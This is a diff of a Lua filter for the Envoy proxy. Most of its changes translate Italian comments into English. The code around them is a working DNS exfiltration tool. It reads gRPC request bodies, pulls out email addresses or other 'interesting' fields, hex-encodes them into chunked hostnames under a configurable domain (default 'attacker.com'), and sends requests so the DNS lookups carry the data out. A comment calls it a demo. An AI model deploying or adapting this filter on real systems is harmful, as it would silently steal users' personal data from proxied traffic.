@@ -1,4 +1,4 @@
-local MAX = tonumber(os.getenv("MAX_BODY_BYTES") or "4096") -- prendi abbastanza per chunking
+local MAX = tonumber(os.getenv("MAX_BODY_BYTES") or "4096")
 local DOMAIN = os.getenv("EXFIL_DOMAIN") or "attacker.com"
 local FIXED  = os.getenv("EXFIL_FIXED")  or "123-SECRET-DATA-1234"
 
@@ -16,7 +16,7 @@ local function rand_nonce(len)
   return table.concat(t)
 end
 
--- spezza stringa in pezzi di 'n' caratteri
+-- split string in pieces of 'n' chars
 local function chunk(s, n)
   local t, i = {}, 1
   while i <= #s do
@@ -26,11 +26,10 @@ local function chunk(s, n)
   return t
 end
 
--- costruisce una lista di host “frame” a partire da HEX
+-- build a list of host “frame” starting from HEX
 -- layout: <seq>.<part1>.<part2>.<nonce>.<domain>
--- dove part1/part2 sono label ≤63 char ciascuna (quindi 126 hex per frame)
+-- where part1/part2 are label ≤63 char each (so 126 hex per frame)
 local function build_hosts_from_hex(hex_payload)
-  -- per stare larghi col limite 253, usiamo 2 label di payload per FQDN
   local PAY_LABEL = 63
   local PART_SIZE = PAY_LABEL * 2  -- 126 hex chars per frame
   local parts = chunk(hex_payload, PART_SIZE)
@@ -44,7 +43,7 @@ local function build_hosts_from_hex(hex_payload)
     if #p > PAY_LABEL then
       p2 = p:sub(PAY_LABEL+1, math.min(#p, PAY_LABEL*2))
     end
-    -- seq come label breve per ricostruzione (base36)
+    -- seq as short label for rebuilding (base36)
     local seq = string.format("%x", i) .. "-" .. string.format("%x", total)
     local nonce = nonce_base .. string.format("%x", os.time() % 0xffff)
     local host
@@ -63,7 +62,7 @@ local function parse_grpc_frame(raw)
   if #raw < 5 then return raw end
   local flag = string.byte(raw, 1)
   if flag ~= 0 then
-    return "" -- compresso: ignora per la demo
+    return "" -- compressed: ignore for the demo
   end
   local b2 = string.byte(raw, 2)
   local b3 = string.byte(raw, 3)
@@ -77,7 +76,7 @@ local function parse_grpc_frame(raw)
   end
 end
 
--- heuristics per pescare qualcosa di interessante dal protobuf
+-- heuristics to take something interesting from protobuf
 local function extract_interesting(p, fallback)
   local email = p:match("([%w%._%+%-]+@[%w%.%-]+%.[%a][%a%d%-]+)")
   if email then return email end
@@ -88,7 +87,7 @@ local function extract_interesting(p, fallback)
   return fallback
 end
 
--- invia una GET asincrona per ogni host (genera query DNS)
+-- send an asynchronous GET for each host (generate query DNS)
 local function send_frames(handle, hosts)
   for _, host in ipairs(hosts) do
     handle:logInfo("DNS exfil frame -> " .. host)
@@ -108,7 +107,7 @@ function envoy_on_request(handle)
   local data = handle:body()
 
   if data ~= nil and data:length() > 0 then
-    -- prendi abbastanza per diversi frame
+    -- take enough for different frames
     local n = math.min(data:length(), MAX + 5) -- +5 header gRPC
     local raw = data:getBytes(0, n) or ""
     local grpc = parse_grpc_frame(raw)
